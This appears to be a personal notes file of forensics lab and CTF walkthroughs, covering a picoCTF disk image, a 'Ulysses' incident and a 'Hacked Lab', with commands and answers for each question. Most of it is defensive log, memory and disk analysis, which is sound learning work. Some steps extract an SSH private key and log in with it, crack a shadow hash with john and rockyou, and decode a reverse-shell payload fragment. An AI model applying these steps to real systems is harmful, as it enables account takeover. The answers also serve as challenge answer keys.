+mmls disk.img
+
+The known challenge image has a Linux partition starting at sector 206848.
+206848
+
+Step 2: Search for the SSH private key
+fls -r -o 206848 disk.img | grep -i 'id_ed25519'
+
+step 3:Extract the private key
+icat -o 206848 disk.img 2345 > key_file
+
+Step 4: Fix key permissions
+chmod 600 key_file
+
+Verify:
+ls -l key_file
+
+step 5:connect to the remote machine
+ssh -i key_file -p PORT ctf-player@saturn.picoctf.net
+
+step 6: Retrieve the flag
+ls -la
+cat flag.txt
+========================================================================================
+
+
+tryhackme
+https://tryhackme.com/room/linuxincidentsurface
+https://tryhackme.com/room/forensicimaging
+https://tryhackme.com/room/linuxserverforensics
+https://tryhackme.com/room/linuxprocessanalysis
+https://tryhackme.com/room/linuxfilesystemanalysis
+
+
+=====================================================================
+ulysses
+
+
+step 1:
+sudo mkdir -p /mnt/ulysses
+sudo mount -o ro,loop,noload victoria-v8.sda1.img /mnt/ulysses
+findmnt /mnt/ulysses
+ls -lah /mnt/Ulysses
+
+1.The attacker was performing a Brute Force attack. What account triggered the alert?
+step 1: grep -i 'Failed' /mnt/ulysses/var/log/auth.log | head -20
+
+-i makes the match case-insensitive, so it catches Failed, failed, and FAILED.
+
+ans :ulysses 
+
+2.During investigating the logs. How many failed login attempts were alerted by the same user?
+step 1: grep -c 'Failed' /mnt/ulysses/var/log/auth.log
+
+ans:32
+
+3.What kind of system runs on the targeted server?
+step 1:cat /mnt/ulysses/etc/issue
+
+ans :Debian GNU/Linux 5.0
+
+
+4.What is the victim's IP address?
+step 1: cat /mnt/ulysses/var/lib/dhcp3/dhclient.eth0.leases | grep 'fixed-address'
+
+ans: 192.168.56.102
+
+
+5.What are the attacker's two IP addresses?
+
+192.168.56.101	Exim4 exploitation (SMTP)
+192.168.56.1	SSH brute-force attack
+
+step 1: grep '192.168.56.1' /mnt/ulysses/var/log/auth.log | head
+step 2: grep -F '192.168.56.101' /mnt/ulysses/var/log/exim4/rejectlog | head
+
+-F tells grep to treat the pattern as a fixed string, not a regular expression. Every character is matched literally, with no special meaning for ., *, [, ], ^, $ and so on.
+
+ans: 192.168.56.1,192.168.56.101
+
+
+Volatility 2 is a memory-forensics framework.
+Understand the command structure
+volatility -f MEMORY_IMAGE --profile=PROFILE_NAME PLUGIN
+
+volatility	Launch Volatility 2
+-f	Memory dump path
+--profile	Operating system/kernel profile
+plugin	Forensic analysis you want to perform
+
+
+List available profiles:
+volatility --info
+
+Find your Ulysses profile:
+volatility --info | grep -i LinuxDebian5
+
+6.What is the nc service PID number that was running on the server?
+step 1: volatility --info | grep -i LinuxDebian5_26x86
+step 2:volatility -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_pslist
+
+
+ans: 2169
+
+7.What service was exploited to gain access to the system?
+Exim4 is the SMTP mail service exploited to gain access to the server using CVE-2010-4344.
+step 1:grep -ri '192.168.56.101' /mnt/ulysses/var/log/exim4/ | head
+
+-r (recursive)
+Searches every file under a directory, descending into subdirectories. You give grep a directory instead of a file:
+
+8.What is the CVE number of exploited vulnerability?
+CVE-2010-4344
+
+
+9.During this attack, the attacker downloaded two files to the server. Provide the name of the compressed file.
+step 1: grep -i '.tar' /mnt/ulysses/var/log/exim4/rejectlog
+step 2:ls -lh /mnt/ulysses/tmp/rk.tar
+
+
+
+10.During the investigation, two ports were involved in the process of data exfiltration. Which port did the nc command used for the exfiltration?
+
+step1 :volatility -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_netstat
+TCP      192.168.56.102  :56955 192.168.56.1    : 8888 ESTABLISHED                    nc/2169 
+
+ans: 8888
+
+11.Which port did the attacker try to block on the firewall?
+
+cd /mnt/ulysses/tmp
+tar -xOf rk.tar rk/install.sh | grep -nE 'iptables'
+
+-n (line numbers)
+Prefixes each matching line with its line number in the file:
+-E on its own enables extended regular expressions, which I covered above under -nE. Here is a quick recap with a bit more depth.
+
+answer:  45295 
+=========================================================================
+
+
+
+==============
+
+Hacked Lab
+
+setup.sh
+
+
+1.What is the system timezone?
+step 1: cat /mnt/hacked-root/etc/timezone
+
+2.Who was the last user to log in to the system?
+step 1:cat var/log/auth.log
+step 2: cat var/log/auth.log | grep 'Accepted password' 
+
+Oct  5 13:23:34 VulnOSv2 sshd[3108]: Accepted password for mail from 192.168.210.131 port 57708 ssh2
+ans:mail
+
+3.What was the source port the user 'mail' connected from?
+step 1: cat var/log/auth.log | grep 'Accepted password' 
+ans: 57708 
+
+4.How long was the last session for user 'mail'? (Minutes only)
+
+step 1 : grep 'session \(opened\|closed\) for user mail' \var/log/auth.log 
+
+Login:  13:23:34
+Logout: 13:24:11
+----------------
+Duration: 37 seconds ->37 seconds rounded up to whole minutes = 1 minute.
+
+
+5.Which server service did the last user use to log in to the system?
+
+step 1:grep 'session opened for user mail' var/log/auth.log | tail -1
+
+ans:sshd
+
+6.What type of authentication attack was performed against the target machine?
+grep  'Failed password' var/log/auth.log
+grep -c 'Failed password' var/log/auth.log
+
+ans:Brute-Force
+
+7.How many IP addresses are listed in the '/var/log/lastlog' file?
+step 1:cat var/log/lastlog   
+step 2:strings -a var/log/lastlog | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' |  sort -u
+step 3:strings -a var/log/lastlog | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u | wc -l
+
+
+awk is a text-processing language built for working with structured, line-based data, like logs, CSVs, and command output. It reads input one line at a time, splits each line into fields (columns), and lets you filter, reformat, or calculate on them
+
+-F sets the field separator, the character (or pattern) that splits each line into fields.
+
+8.How many users have a login shell?
+awk -F: '$7 ~ /\/(bash|sh|dash|zsh)$/ {print $1, "->", $7}' etc/passwd
+awk -F: '$7 ~ /\/(bash|sh|dash|zsh)$/ {count++} END {print count+0}' etc/passwd
+
+ans:5
+
+
+9.What is the password of the mail user?
+
+Create the unshadow file
+mkdir -p /tmp/hacked-lab
+unshadow etc/passwd etc/shadow > /tmp/hacked-lab/unshadow.txt
+
+Extract the mail user's hash
+grep '^mail:' /tmp/hacked-lab/unshadow.txt > /tmp/hacked-lab/mail.hash
+
+Check RockYou wordlist
+ls -lh /usr/share/wordlists/rockyou.txt*
+
+gzip -dk /usr/share/wordlists/rockyou.txt.gz
+
+-d (decompress)
+-k (keep)
+By default, gzip deletes the original after compressing or decompressing. -k keeps it,
+
+Crack the password
+john --wordlist=/usr/share/wordlists/rockyou.txt \
+/tmp/hacked-lab/mail.hash
+
+ans:forensics
+
+
+10.Which user account was created by the attacker?
+step 1:grep -Ei 'useradd|new user|adduser' var/log/auth.log
+step 2:grep '^php:' etc/passwd
+step 3:grep '^php:' etc/passwd | cut -d: -f6
+
+ans :php
+
+11.How many user groups exist on the machine?
+cat etc/group
+wc -l etc/group
+ans:58
+
+12.How many users have sudo access?
+grep '^sudo:' etc/group
+
+ans:2
+
+13.What is the home directory of the PHP user?
+
+grep '^php:' etc/passwd
+
+ans:/usr/php
+
+14.What command did the attacker use to gain root privilege? (Answer contains two spaces).
+cat var/mail/.bash_history
+
+ans:sudo su-
+
+15.Which file did the user 'root' delete?
+cat root/.bash_history
+
+37292.c
+
+16.Recover the deleted file, open it and extract the exploit author name.
+fls is from The Sleuth Kit.It lists files and directories in a filesystem, including entries that have been deleted, by reading the filesystem metadata directly. 
+-r: recurse into all subdirectories, not just the top level.
+-d: show deleted entries only.
+-p: print the full path of each entry
+
+step 1:
+LV="/dev/mapper/VulnOSv2--vg-root"
+fls -r -d -p "$LV" | grep '37292.c'
+
+step 2:
+mkdir -p /home/kali/Downloads/recovered
+
+icat "$LV" 12345 \
+> /home/kali/Downloads/recovered/37292.c
+
+
+icat is another Sleuth Kit tool. It reads the data blocks of a file by inode number and writes the contents to standard output. It works even if the filename and directory entry are gone, as long as the inode and its data still exist.
+
+
+step 3:
+mkdir -p /home/kali/Downloads/recovered
+
+icat "$LV" 12345 \
+> /home/kali/Downloads/recovered/37292.c
+
+step 4:
+head -20 /home/kali/Downloads/recovered/37292.c
+
+step 5:
+grep -i 'Exploit Author' \
+/home/kali/Downloads/recovered/37292.c
+
+method 2
+strings -a /dev/mapper/VulnOSv2--vg-root | 
+grep -i -m 5 -A 6 -B 4 'Exploit Author'
+
+17.What is the content management system (CMS) installed on the machine?
+ls -la var/www/html/jabc/
+
+or
+cat home/vulnosadmin/.bash_history
+
+
+grep -inE 'drupal|wget|tar|7\.' home/vulnosadmin/.bash_history
+
+18.What is the version of the CMS installed on the machine?
+
+grep -n 'VERSION' var/www/html/jabc/includes/bootstrap.inc
+head -25 var/www/html/jabc/includes/bootstrap.inc
+ans: 7.26
+
+
+19.Which port was listening to receive the attacker's reverse shell?
+grep -o 'ICRwb3J0ID0gNDQ0NDs' var/log/apache2/access.log | head -1 | base64 -d
+
+python3 -c 'import re,urllib.parse; [print(re.search(r"base64_decode\(([^()]*)\)",urllib.parse.unquote(l)).group(1)) for l in open("var/log/apache2/access.log") if "192.168.210.131" in l and "base64_decode" in l and re.search(r"base64_decode\(([^()]*)\)",urllib.parse.unquote(l))]'
+=====================
